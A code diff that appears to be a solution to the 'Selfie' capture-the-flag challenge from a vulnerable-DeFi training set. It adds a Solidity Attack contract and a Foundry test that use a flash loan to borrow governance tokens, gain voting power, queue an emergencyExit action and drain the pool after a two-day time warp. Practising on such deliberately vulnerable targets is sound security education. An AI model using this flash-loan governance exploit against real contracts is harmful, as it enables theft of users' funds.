@@ -62,7 +62,10 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        Attack attack = new Attack(address(pool), address(governance), address(token), recovery);
+        attack.attack();
+        vm.warp(block.timestamp + 2 days);
+        attack.executeProposal();
     }
 
     /**
@@ -72,5 +75,51 @@ contract SelfieChallenge is Test {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+contract Attack is IERC3156FlashBorrower {
+
+    SelfiePool pool;
+    SimpleGovernance governance;
+    DamnValuableVotes token;
+    address recovery;
+    uint256 actionId;
+    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+
+    /** @dev Constructor will initialize all the
+    * relevant contracts we need to interact 
+    * with to take all the tokens */
+    constructor(address _pool, address _governance, address _token, address _recovery) {
+        pool = SelfiePool(_pool);
+        governance = SimpleGovernance(_governance);
+        token = DamnValuableVotes(_token);
+        recovery = _recovery;
+    }
+
+    /** @dev We use flashLoan to interact with the SelfiePool contract.
+    * We make the attack contract a ERC3156FlashBorrower,
+    * since flashLoan checks if onFlashLoan is successful
+    * we create the below function to set up the attack.
+    * flashLoan, finally checks if the balance is the same
+    * which we do not care for since emergencyExit will be 
+    * used to drain the contract.*/
+    function onFlashLoan(address initiator, address _token, uint256 amount, uint256 fee, bytes calldata data) external returns (bytes32){
+        token.delegate(address(this));
+        actionId = governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", recovery));
+        token.approve(address(pool), amount);
+        return CALLBACK_SUCCESS;
+    }
+
+    /** @dev Call flashLoan to initiate the attack. */
+    function attack() external {
+        pool.flashLoan(this, address(token), pool.maxFlashLoan(address(token)), "");
+    }
+
+    /** @dev After we setup the attack with onFlashLoan, we wait
+    * the 2 day restriction to drain the contract. */
+    function executeProposal() external {
+        governance.executeAction(actionId);
     }
 }
